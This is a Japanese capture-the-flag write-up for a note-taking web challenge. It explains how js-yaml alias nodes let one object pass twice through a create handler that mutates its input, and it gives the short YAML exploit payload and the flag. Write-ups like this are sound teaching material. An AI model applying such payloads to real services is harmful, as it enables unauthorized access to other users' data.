# Bulk Note

[English version is here](./README.md)

## 説明

複数のメモを同時に作成できるようにしました！隠れたメモを読めますか？

## Writeup

### 概要

`POST /` はYAMLデータを受け取り、`command` フィールドに応じて異なる処理を行います。（`load` 関数は `js-yaml` のものであることに注意してください）

```javascript
app.post("/", (req, res) => {
  let parsedDocs;
  try {
    parsedDocs = load(req.body || "");
  } catch (err) {
    /* ... */
  }

  /* ... */

  const results = [];
  for (let i = 0; i < parsedDocs.length; i += 1) {
    const doc = parsedDocs[i];
    if (!doc || typeof doc !== "object" || Array.isArray(doc)) {
      return res.status(400).json({ error: "invalid document", index: i });
    }

    const command = doc.command;
    if (
      typeof doc.command !== "string" ||
      !Object.hasOwn(commandHandlers, command)
    ) {
      return res
        .status(400)
        .json({ error: "unknown command", index: i, command });
    }
    const handler = commandHandlers[command];
    const [result, error] = handler(doc, i, req.sessionId);
    if (error) {
      return res.status(400).json(error);
    }
    results.push(result);
  }

  return res.status(200).json({ results });
});
```

フラグにアクセスする唯一の方法は、`create` コマンドを使用することです：

```javascript
function handleCreateCommand(doc, index, sessionId) {
  const content = doc.content;
  if (typeof content !== "string") {
    return [null, { error: "invalid content", index }];
  }

  const id = randomUUID();
  doc.sessionId = sessionId;
  if (doc.isHidden) {
    doc.content = FLAG;
    delete doc.sessionId;
    delete doc.isHidden;
  }
  notes.set(id, doc);

  return [
    {
      command: "create",
      id,
    },
    null,
  ];
}
```

しかし、そう簡単ではありません：
* `isHidden` が true の場合、コンテンツはフラグに設定されますが、関連付けられたセッションIDは undefined になります。そのため、`get` コマンドで後から参照することができません。
* `isHidden` が false の場合、`get` コマンドで内容を見ることができますが、コンテンツは入力したままの状態になります。

### 脆弱性

まず注目すべき点は、**何らかの方法で同じ `doc` オブジェクトを `handleCreateCommand` に2回通過させることができれば、`get` コマンドを通じてフラグを見ることができるようになる**ということです。
* 1回目の実行では、`content` がフラグに設定され、`sessionId` と `isHidden` が削除されます。
* 2回目の実行では、`sessionId` が復元されます。`isHidden` フィールドは既に削除されているため、再度削除されることはありません。

どうすれば同じオブジェクトを2回 `create` コマンドに通すことができるでしょうか？ 答えは、**[エイリアスノード (alias nodes)](https://yaml.org/spec/1.2.2/#71-alias-nodes)** にあります。

```yaml
first: &v
  foo: bar
second: *v
# JSON相当: {"first":{"foo":"bar"},"second":{"foo":"bar"}}
```

これは同じ値を別の場所にコピーする略式の記法ではありません。実際には、両方のキーが同じオブジェクトを参照するようになります。

```javascript
import { load } from "js-yaml";

const parsed = load(`
first: &v
  foo: bar
second: *v
`);

console.log(parsed) // { first: { foo: 'bar' }, second: { foo: 'bar' } }

parsed.first.foo = "changed";

console.log(parsed) // { first: { foo: 'changed' }, second: { foo: 'changed' } }
```

これこそが必要なものです。

```yaml
- &anchor
  command: create
  content: foobar
  isHidden: true
- *anchor
```

完全な solve スクリプトについては [solver.py](./solver.py) を参照してください。

## Flag

`Alpaca{y4ml_1snt_bett3r_JS0N}`
